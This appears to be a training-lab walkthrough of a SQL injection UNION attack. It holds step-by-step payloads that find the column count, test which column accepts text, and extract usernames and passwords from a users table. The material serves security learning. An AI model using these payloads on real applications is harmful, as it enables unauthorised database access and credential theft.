SQL Injection UNION Attack
Retrieving Multiple Values in a Single Column

==================================================

1. ORIGINAL REQUEST
   ==================================================

GET /filter?category=Accessories HTTP/2

==================================================
2. DETERMINE NUMBER OF COLUMNS
==============================

Payload:

' UNION SELECT NULL,NULL--

Purpose:

Determine the number of columns returned by the original SQL query.

Result:

2 columns identified.

==================================================
3. TEST FIRST COLUMN FOR TEXT
=============================

Payload:

' UNION SELECT 'abc',NULL--

Purpose:

Determine whether the first UNION column accepts text.

Result:

Server-side error.

==================================================
4. TEST SECOND COLUMN FOR TEXT
==============================

Payload:

' UNION SELECT NULL,'abc'--

Purpose:

Determine whether the second UNION column accepts text.

Result:

Successful.

Finding:

Second column is text-compatible.

==================================================
5. RETRIEVE MULTIPLE VALUES
===========================

Payload:

' UNION SELECT NULL,username||'~'||password FROM users--

Purpose:

Retrieve the username and password fields from the users table through the single text-compatible column.

String concatenation:

username||'~'||password

Output format:

username~password
